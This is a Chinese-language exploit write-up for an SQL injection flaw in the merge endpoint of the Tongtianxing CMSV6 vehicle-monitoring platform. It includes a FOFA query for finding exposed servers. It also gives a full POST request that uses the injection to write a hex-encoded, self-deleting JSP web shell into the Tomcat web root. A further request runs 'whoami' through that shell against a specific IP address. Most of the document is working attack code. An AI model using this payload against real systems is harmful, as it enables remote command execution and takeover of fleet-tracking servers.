##  通天星CMSV6车载定位监控平台merge接口简介

通天星CMSV6车载主动安全监控云平台

## 漏洞描述

通天星CMSV6车载主动安全监控云平台实现对计算资源、存储资源、网络资源、云应用服务进行7*24小时全时区、多地域、全方位、立体式、智能化的IT运维监控，保障IT系统安全、稳定、可靠运行。通天星CMSV6车载定位监控平台merge接口存在SQL注入漏洞。

## 影响版本

通天星CMSV6车载主动安全监控云平台

## fofa查询语句

body="/808gps/"

## 5.漏洞复现

poc 1:       GET 漏洞链接：http://xx.xx.xx.xx/point_manage/merge

POC2:  漏洞链接：http://xx.xx.xx.xx/point_manage/merge

漏洞数据包，通过注入漏洞写文件。

```yaml
POST /point_manage/merge HTTP/1.1
User-Agent:Mozilla/5.0(X11;Linux x86_64)AppleWebKit/537.36(KHTML, like Gecko)Chrome/94.0.2882.93Safari/537.36
Accept-Encoding: gzip, deflate
Accept:*/*
Connection: close
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
Content-Length: 855

id=1&name=1' UNION SELECT%0aNULL, 0x3c25206a6176612e696f2e496e70757453747265616d20696e203d2052756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b6f75742e7072696e7428223c7072653e22293b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e6728622c302c6129293b7d6f75742e7072696e7428223c2f7072653e22293b6e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b253e,NULL,NULL,NULL,NULL,NULL,NULL
INTO dumpfile '../../tomcat/webapps/gpsweb/004066.jsp' FROM user_session a
WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8

```

```yaml
GET /004066.jsp?cmd=whoami HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 106.12.144.148
Cookie: JSESSIONID=6AED9D3D35A441AD769EEDB245789977; 
```

上传的文件地址：http://xxx.xx.xx.xx/004066.jsp?cmd=whoami